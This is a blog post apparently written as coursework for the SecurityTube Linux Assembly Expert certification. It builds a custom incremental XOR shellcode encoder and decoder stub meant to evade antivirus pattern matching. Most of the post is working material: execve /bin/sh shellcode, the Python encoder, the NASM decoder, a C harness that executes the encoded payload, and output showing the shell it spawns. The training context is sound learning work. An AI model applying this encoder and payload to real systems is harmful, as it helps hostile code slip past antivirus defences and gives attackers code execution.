
# SLAE Assignment #4

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://securitytube-training.com/online‐courses/securitytube-linux-assembly-expert/

Student ID: SLAE-935

## Assignment

* Create a custom encoding scheme like the "Insertion Encoder" we showed you 
* PoC with using execve-­‐stack as the shellcode to encode with your schema and execute

## Theoretical description

The incremental encoder works in such way that the decoded shellcode is never present at once in memory, but it's decoded backwards in bunch of a certain number of bytes (called segments) and then executed partially. At the end of execution the registers are preserved and the routine decodes the next bunch. In this way the common antiviruses based on pattern matching will find it very difficult to track such execution

## Implementation

The implementation starts with shellcode extraction for the execve-stack

### Opcode extraction

The already written assembler code that execute a shell (execve-stack) is the following

```
; Filename: execve-nasm.nasm
; Author:  SLAE-935
;
; Purpose: execute /bin/sh

global _start			

section .text

_start:

	xor eax, eax
	push eax

	; PUSH //bin/sh (8 bytes) 
	push 0x68732f2f
	push 0x6e69622f

	mov ebx, esp

	push eax
	mov edx, esp

	push ebx
	mov ecx, esp

	mov al, 11
	int 0x80
```

let's extract the shellcode in the usual way with the aid of the following helper script:

```
#!/bin/bash

echo '######### NASM #########'

echo '[+] Assembling with Nasm ... '
nasm -f elf32 -o execve-stack.o execve-stack.nasm
echo '[+] Done!'

echo '[+] Linking ...'
ld -z execstack -o execve-stack execve-stack.o
echo '[+] Done!'

echo '[+] Objdump ...'
objdump -d ./execve-stack|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\\x/g'|paste -d '' -s |sed 's/^/"/' | sed 's/$/"/g'

rm -rf execve-stack.o
rm -rf execve-stack
```

Let's execute it

```
$ ./compile-execve-stack.sh 
######### NASM #########
[+] Assembling with Nasm ... 
[+] Done!
[+] Linking ...
[+] Done!
[+] Objdump ...
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
```

Hence the shellcode is the following:

```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
```

### Custom python encoder

Here follows the python encoder, it takes as input a shellcode and generate the corresponding encoded one to append after the decoder stub, xoring with the encryption 4 bytes key and adding to every chunk the jump back statement, and eventually a padding.

```python
#!/usr/bin/python
# Python Custom Incremental Encoder
# Author: SLAE-935

import random
from BitVector import * # https://engineering.purdue.edu/kak/dist/BitVector-3.4.7.html#8

shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
segment_size = 11

encoded = ""
encoded2 = ""
current_segment_encoded = ""
current_segment_encoded2 = ""

current_encrypt_key = 0xfbe7b6fd #0xfdb6e7fb #Little Endian (it should be the opposite of asm)
segment_jump_back_stub = 0xC3 # RET (pops latest 4bytes from the stack and put them in EIP returning to get_pc)

print 'Encoded shellcode ...'
shellcode_byte_ar = bytearray(shellcode)
lastIndex = 0
current_segment_size = 0 

shellcode_enc = BitVector(size = 0)

# Nop-Pad-Right the latest group if not a dword
for x in range(0, (4 - len(shellcode_byte_ar) % 4)):
    shellcode_byte_ar.append(0x90) 
  
# Progressive 4bytes xor encoder
for x in range(4, len(shellcode_byte_ar) + 4, 4):
    shellcode_chunk = BitVector(rawbytes = shellcode_byte_ar[lastIndex:x])
    key = BitVector(intVal=current_encrypt_key)
    print "Original chunk: " + shellcode_chunk.get_bitvector_in_hex()
    shellcode_enc_chunk = shellcode_chunk ^ key
    # xor current 4 bytes chunk
    shellcode_enc += shellcode_enc_chunk
    print "Encoded chunk: " + shellcode_enc_chunk.get_bitvector_in_hex()
    lastIndex = x
    current_segment_size += 4
    if (current_segment_size == segment_size):
        current_encrypt_key += 1
        current_segment_size = 0
# print(shellcode_enc.get_bitvector_in_hex())
# 31c050682f2f7368682f62696e89e35089e25389e1b00bcd80909090 Original
# ca27e695d4c8c59593c8d494956e55ad7205e5741a57bd307b77266d Encoded

# writes shellcode in c compatible format
current_segment_size = 0
for x in bytearray(shellcode_enc.get_bitvector_in_ascii()):
    current_segment_encoded += '\\x%02x' % x 
    current_segment_encoded2 += '0x%02x,' % x
    current_segment_size += 1
    # every 4 * segment_size bytes insert a callback stub
    if (current_segment_size == 4 * segment_size):
        current_segment_encoded += '\\x%02x' % segment_jump_back_stub
        current_segment_encoded2 += '0x%02x,' % segment_jump_back_stub
        current_segment_size = 0

print 'Original Shellcode: 31c050682f2f7368682f62696e89e35089e25389e1b00bcd80909090'
print 'Encoded Shellcode:  ' + shellcode_enc.get_bitvector_in_hex()
print 'Shellcode in compatible c format:'
print current_segment_encoded
print current_segment_encoded2

print 'Generating assembly for decoder'
print 'Len: %d' % len(bytearray(shellcode))
```

## Decoder stub

here follows the assembler code of the decoder stub

```
; Filename: Decoder.nasm
; Author:  SLAE-935
;
; Purpose: decode bytecode in chunks of 8 bytes preserving the status

global _start			

section .text

_start:

    mov ebx, 0xfdb6e7fb ; initial encrypt key
    push ebx
    xor edx,edx ; i = 0
    push edx
    pop edx ; begin for loop
    pop ebx
    jmp short call_get_pc ; getPC
get_pc:
    pop edi ; edi=buff addr
    xor ecx,ecx
    cmp edx,ecx
copy_init:
    jz decode_init ; skip copy if i==0
    xor ecx,ecx
    mov cl, 0xc ; words to copy
    push ebx
    push edx
    mov esi,edx
    imul esi,ecx
    shl esi,0x2
    add esi,edi ; esi=edi+(i*ecx*4)
copy_loop:
    mov ebx,ecx ; copy loop
    sub bl,0x1
    shl ebx,0x2 ; ebx=(ecx-1)*4
    mov edx,[esi+ebx] ; tmp=src
    mov [edi+ebx],edx ; dst=tmp
    loop copy_loop
    pop edx ; edx=i
    pop ebx ; ebx=key
decode_init:
    xor ecx, ecx
    mov cl, 0xc ; words to decode
decode_loop:
    xor [ edi + ecx * 4 - 0x4 ], ebx ; decode loop
    loop decode_loop
    add ebx, [ edi ] ; modify key
    push ebx ; store for next loop
    inc edx ; i++
    push edx ; store for next loop
    call EncodedShellcode ; call decoded buffer
call_get_pc:
    call get_pc

; Sample without Encryption
; EncodedShellcode: db 0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0xC3,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0xC3,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0xC3,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0xC3,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0xC3,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0xC3,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0xC3,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90
; Encoded shellcode with Xor
EncodedShellcode: db 0xca,0x27,0xe6,0x95,0xd4,0xc8,0xc5,0x95,0x93,0xc8,0xd4,0x94,0x95,0x6e,0x55,0xad,0x72,0x05,0xe5,0x74,0x1a,0x57,0xbd,0x30,0x7b,0x77,0x26,0x6d
```

Wrapping all together in a c program:

```
// Filename: shellcode.c
// Author:  SLAE-935
//
// Purpose: Execute the incremental decoder stub on the partial xored chunk of encoded shellcode

#include<stdio.h>
#include<string.h>
unsigned char code[] = \
// Sample without Encryption: "\xbb\xfb\xe7\xb6\xfd\x53\x31\xd2\x52\x5a\x5b\xeb\x45\x5f\x31\xc9\x39\xca\x74\x26\x31\xc9\x8a\x0d\x47\x82\x04\x08\x53\x52\x89\xd6\x0f\xaf\xf1\xc1\xe6\x02\x01\xfe\x89\xcb\x80\xeb\x01\xc1\xe3\x02\x8b\x14\x1e\x89\x14\x1f\xe2\xf0\x5a\x5b\x31\xc9\x8a\x0d\x47\x82\x04\x08\x31\x5c\x8f\xfc\xe2\xfa\x03\x1f\x53\x42\x52\xe8\x05\x00\x00\x00\xe8\xb6\xff\xff\xff\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc3\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc3\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc3\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc3\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc3\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc3\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc3\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x0c";
// Decoder Stub + Encoded shellcode with Xor:
"\xbb\xfb\xe7\xb6\xfd\x53\x31\xd2\x52\x5a\x5b\xeb\x3d\x5f\x31\xc9\x39\xca\x74\x22\x31\xc9\xb1\x0c\x53\x52\x89\xd6\x0f\xaf\xf1\xc1\xe6\x02\x01\xfe\x89\xcb\x80\xeb\x01\xc1\xe3\x02\x8b\x14\x1e\x89\x14\x1f\xe2\xf0\x5a\x5b\x31\xc9\xb1\x0c\x31\x5c\x8f\xfc\xe2\xfa\x03\x1f\x53\x42\x52\xe8\x05\x00\x00\x00\xe8\xbe\xff\xff\xff\xca\x27\xe6\x95\xd4\xc8\xc5\x95\x93\xc8\xd4\x94\x95\x6e\x55\xad\x72\x05\xe5\x74\x1a\x57\xbd\x30\x7b\x77\x26\x6d";
void main()
{
    printf("Shellcode Length:  %d\n", strlen(code));
    int (*ret)() = (int(*)())code;
    ret();
}
```

And compiling with

```
gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
```

## Proof of execution

Once executed the shellcode leads to the following

```
$ ./shellcode 
Shellcode Length:  71
$ id
uid=1000(vagrant) gid=1000(vagrant) groups=1000(vagrant),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),110(sambashare),999(admin)
$ 
```